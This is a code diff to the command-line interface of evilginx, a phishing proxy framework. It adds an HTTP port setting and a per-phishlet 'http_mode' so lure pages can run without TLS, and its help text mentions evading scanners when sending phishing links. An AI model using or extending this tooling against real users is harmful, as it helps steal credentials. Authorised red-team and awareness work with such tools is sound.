@@ -192,8 +192,8 @@ func (t *Terminal) handleConfig(args []string) error {
 			gophishInsecure = "true"
 		}
 
-		keys := []string{"domain", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "autocert", "gophish admin_url", "gophish api_key", "gophish insecure"}
-		vals := []string{t.cfg.general.Domain, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure}
+		keys := []string{"domain", "external_ipv4", "bind_ipv4", "https_port", "http_port", "dns_port", "unauth_url", "autocert", "gophish admin_url", "gophish api_key", "gophish insecure"}
+		vals := []string{t.cfg.general.Domain, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.HttpPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure}
 		log.Printf("\n%s\n", AsRows(keys, vals))
 		return nil
 	} else if pn == 2 {
@@ -205,6 +205,14 @@ func (t *Terminal) handleConfig(args []string) error {
 			return nil
 		case "ipv4":
 			t.cfg.SetServerExternalIP(args[1])
+			return nil
+		case "http_port":
+			port, err := strconv.Atoi(args[1])
+			if err != nil {
+				return fmt.Errorf("invalid port number: %s", args[1])
+			}
+			t.cfg.SetHttpPort(port)
+			log.Warning("you need to restart evilginx for the changes to take effect")
 			return nil
 		case "unauth_url":
 			if len(args[1]) > 0 {
@@ -629,6 +637,10 @@ func (t *Terminal) handlePhishlets(args []string) error {
 			if pl.isTemplate {
 				return fmt.Errorf("phishlet '%s' is a template - you have to 'create' child phishlet from it, with predefined parameters, before you can enable it.", args[1])
 			}
+			// Apply default http_mode from phishlet YAML if specified
+			if pl.HasDefaultHttpMode() && !t.cfg.IsPhishletHttpModeEnabled(args[1]) {
+				t.cfg.SetPhishletHttpMode(args[1], true)
+			}
 			err = t.cfg.SetSiteEnabled(args[1])
 			if err != nil {
 				t.cfg.SetSiteDisabled(args[1])
@@ -694,6 +706,27 @@ func (t *Terminal) handlePhishlets(args []string) error {
 			}
 			t.cfg.SetSiteUnauthUrl(args[1], args[2])
 			return nil
+		case "http_mode":
+			_, err := t.cfg.GetPhishlet(args[1])
+			if err != nil {
+				return err
+			}
+			switch args[2] {
+			case "on":
+				err := t.cfg.SetPhishletHttpMode(args[1], true)
+				if err != nil {
+					return err
+				}
+				return nil
+			case "off":
+				err := t.cfg.SetPhishletHttpMode(args[1], false)
+				if err != nil {
+					return err
+				}
+				return nil
+			default:
+				return fmt.Errorf("http_mode value must be 'on' or 'off'")
+			}
 		}
 	}
 	return fmt.Errorf("invalid syntax: %s", args)
@@ -755,7 +788,12 @@ func (t *Terminal) handleLures(args []string) error {
 
 				var base_url string
 				if l.Hostname != "" {
-					base_url = "https://" + l.Hostname + l.Path
+					// Use correct scheme based on http_mode setting
+					scheme := "https"
+					if t.cfg.IsPhishletHttpModeEnabled(l.Phishlet) {
+						scheme = "http"
+					}
+					base_url = scheme + "://" + l.Hostname + l.Path
 				} else {
 					purl, err := pl.GetLureUrl(l.Path)
 					if err != nil {
@@ -1161,13 +1199,15 @@ func (t *Terminal) monitorLurePause() {
 func (t *Terminal) createHelp() {
 	h, _ := NewHelp()
 	h.AddCommand("config", "general", "manage general configuration", "Shows values of all configuration variables and allows to change them.", LAYER_TOP,
-		readline.PcItem("config", readline.PcItem("domain"), readline.PcItem("ipv4", readline.PcItem("external"), readline.PcItem("bind")), readline.PcItem("unauth_url"), readline.PcItem("autocert", readline.PcItem("on"), readline.PcItem("off")),
+		readline.PcItem("config", readline.PcItem("domain"), readline.PcItem("ipv4", readline.PcItem("external"), readline.PcItem("bind")),
+			readline.PcItem("http_port"), readline.PcItem("unauth_url"), readline.PcItem("autocert", readline.PcItem("on"), readline.PcItem("off")),
 			readline.PcItem("gophish", readline.PcItem("admin_url"), readline.PcItem("api_key"), readline.PcItem("insecure", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("test"))))
 	h.AddSubCommand("config", nil, "", "show all configuration variables")
 	h.AddSubCommand("config", []string{"domain"}, "domain <domain>", "set base domain for all phishlets (e.g. evilsite.com)")
 	h.AddSubCommand("config", []string{"ipv4"}, "ipv4 <ipv4_address>", "set ipv4 external address of the current server")
 	h.AddSubCommand("config", []string{"ipv4", "external"}, "ipv4 external <ipv4_address>", "set ipv4 external address of the current server")
 	h.AddSubCommand("config", []string{"ipv4", "bind"}, "ipv4 bind <ipv4_address>", "set ipv4 bind address of the current server")
+	h.AddSubCommand("config", []string{"http_port"}, "http_port <port>", "set the HTTP port for http_mode phishlets (default: 80)")
 	h.AddSubCommand("config", []string{"unauth_url"}, "unauth_url <url>", "change the url where all unauthorized requests will be redirected to")
 	h.AddSubCommand("config", []string{"autocert"}, "autocert <on|off>", "enable or disable the automated certificate retrieval from letsencrypt")
 	h.AddSubCommand("config", []string{"gophish", "admin_url"}, "gophish admin_url <url>", "set up the admin url of a gophish instance to communicate with (e.g. https://gophish.domain.com:7777)")
@@ -1191,13 +1231,15 @@ func (t *Terminal) createHelp() {
 			readline.PcItem("hostname", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("enable", readline.PcItemDynamic(t.phishletPrefixCompleter)),
 			readline.PcItem("disable", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("hide", readline.PcItemDynamic(t.phishletPrefixCompleter)),
 			readline.PcItem("unhide", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-hosts", readline.PcItemDynamic(t.phishletPrefixCompleter)),
-			readline.PcItem("unauth_url", readline.PcItemDynamic(t.phishletPrefixCompleter))))
+			readline.PcItem("unauth_url", readline.PcItemDynamic(t.phishletPrefixCompleter)),
+			readline.PcItem("http_mode", readline.PcItemDynamic(t.phishletPrefixCompleter, readline.PcItem("on"), readline.PcItem("off")))))
 	h.AddSubCommand("phishlets", nil, "", "show status of all available phishlets")
 	h.AddSubCommand("phishlets", nil, "<phishlet>", "show details of a specific phishlets")
 	h.AddSubCommand("phishlets", []string{"create"}, "create <phishlet> <child_name> <key1=value1> <key2=value2>", "create child phishlet from a template phishlet with custom parameters")
 	h.AddSubCommand("phishlets", []string{"delete"}, "delete <phishlet>", "delete child phishlet")
 	h.AddSubCommand("phishlets", []string{"hostname"}, "hostname <phishlet> <hostname>", "set hostname for given phishlet (e.g. this.is.not.a.phishing.site.evilsite.com)")
 	h.AddSubCommand("phishlets", []string{"unauth_url"}, "unauth_url <phishlet> <url>", "override global unauth_url just for this phishlet")
+	h.AddSubCommand("phishlets", []string{"http_mode"}, "http_mode <phishlet> <on|off>", "enable HTTP mode for phishing server (no TLS required) - use for awareness campaigns over HTTP")
 	h.AddSubCommand("phishlets", []string{"enable"}, "enable <phishlet>", "enables phishlet and requests ssl/tls certificate if needed")
 	h.AddSubCommand("phishlets", []string{"disable"}, "disable <phishlet>", "disables phishlet")
 	h.AddSubCommand("phishlets", []string{"hide"}, "hide <phishlet>", "hides the phishing page, logging and redirecting all requests to it (good for avoiding scanners when sending out phishing links)")
@@ -1325,7 +1367,7 @@ func (t *Terminal) checkStatus() {
 func (t *Terminal) manageCertificates(verbose bool) {
 	if !t.p.developer {
 		if t.cfg.IsAutocertEnabled() {
-			hosts := t.p.cfg.GetActiveHostnames("")
+			hosts := t.p.cfg.GetActiveHttpsHostnames("")
 			//wc_host := t.p.cfg.GetWildcardHostname()
 			//hosts := []string{wc_host}
 			//hosts = append(hosts, t.p.cfg.GetActiveHostnames("")...)
@@ -1361,8 +1403,9 @@ func (t *Terminal) sprintPhishletStatus(site string) string {
 	yellow := color.New(color.FgYellow)
 	higray := color.New(color.FgWhite)
 	logray := color.New(color.FgHiBlack)
+	orange := color.New(color.FgYellow) // Used for HTTP mode indicator
 	n := 0
-	cols := []string{"phishlet", "status", "visibility", "hostname", "unauth_url"}
+	cols := []string{"phishlet", "status", "visibility", "http_mode", "hostname", "unauth_url"}
 	var rows [][]string
 
 	var pnames []string
@@ -1389,6 +1432,10 @@ func (t *Terminal) sprintPhishletStatus(site string) string {
 			if t.cfg.IsSiteHidden(s) {
 				hidden_status = logray.Sprint("hidden")
 			}
+			http_mode_status := logray.Sprint("off")
+			if t.cfg.IsPhishletHttpModeEnabled(s) {
+				http_mode_status = orange.Sprint("on")
+			}
 			domain, _ := t.cfg.GetSiteDomain(s)
 			unauth_url, _ := t.cfg.GetSiteUnauthUrl(s)
 			n += 1
@@ -1405,11 +1452,11 @@ func (t *Terminal) sprintPhishletStatus(site string) string {
 					}
 				}
 
-				keys := []string{"phishlet", "parent", "status", "visibility", "hostname", "unauth_url", "params"}
-				vals := []string{hiblue.Sprint(s), blue.Sprint(pl.ParentName), status, hidden_status, cyan.Sprint(domain), logreen.Sprint(unauth_url), logray.Sprint(param_names)}
+				keys := []string{"phishlet", "parent", "status", "visibility", "http_mode", "hostname", "unauth_url", "params"}
+				vals := []string{hiblue.Sprint(s), blue.Sprint(pl.ParentName), status, hidden_status, http_mode_status, cyan.Sprint(domain), logreen.Sprint(unauth_url), logray.Sprint(param_names)}
 				return AsRows(keys, vals)
 			} else if site == "" {
-				rows = append(rows, []string{hiblue.Sprint(s), status, hidden_status, cyan.Sprint(domain), logreen.Sprint(unauth_url)})
+				rows = append(rows, []string{hiblue.Sprint(s), status, hidden_status, http_mode_status, cyan.Sprint(domain), logreen.Sprint(unauth_url)})
 			}
 		}
 	}
